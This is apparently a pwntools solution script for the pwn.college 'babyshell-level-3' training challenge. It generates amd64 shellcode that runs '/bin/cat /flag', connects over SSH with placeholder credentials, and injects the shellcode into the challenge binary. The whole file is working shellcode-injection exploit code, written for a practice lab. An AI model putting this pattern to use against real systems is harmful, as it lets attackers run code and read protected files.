from pwn import *

context.arch='amd64'
context.os='linux'

asm_code = shellcraft.execve(path="/bin/cat", argv=["/bin/cat", "/flag"])
shellcode=asm(asm_code)
print(shellcode)
FILE="/challenge/babyshell-level-3"
HOST='pwn.college'
username='hacker'
password='password'
port=22

ssh_connection=ssh(user=username, host=HOST, port=port, password=password)

process=ssh_connection.process(FILE)

process.recvuntil("Reading 0x1000 bytes from stdin.")
process.sendline(shellcode)
process.interactive()
ssh_connection.close()
